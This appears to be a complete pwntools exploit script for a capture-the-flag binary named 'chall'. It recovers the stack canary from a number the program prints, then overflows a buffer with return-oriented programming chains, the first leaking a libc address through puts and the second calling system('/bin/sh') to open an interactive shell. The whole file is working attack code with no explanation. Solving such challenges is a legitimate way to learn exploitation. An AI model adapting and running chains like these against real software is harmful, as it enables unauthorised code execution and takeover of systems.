from pwn import *
import struct

p = process('chall')
e = ELF('chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x400e93
ret = 0x4006a6

p.sendlineafter('> ', 'a')
p.sendlineafter('> ', '16')
p.sendlineafter('Time[sec]: ', 'a')
p.recvuntil('Stop the timer as close to ')
x = p.recvuntil(' ')[:-1]
canary = struct.pack("<d", float(x))
print(canary)

payload = b'A' * 0x18
payload += canary
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(e.got['__libc_start_main'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['_start'])

p.sendline('\n')
p.sendlineafter('(Y/n) ', payload)

libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['__libc_start_main']
print(hex(libc.address))

payload = b'A' * 0x88
payload += canary
payload += p64(0)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendlineafter('> ', payload)

p.interactive()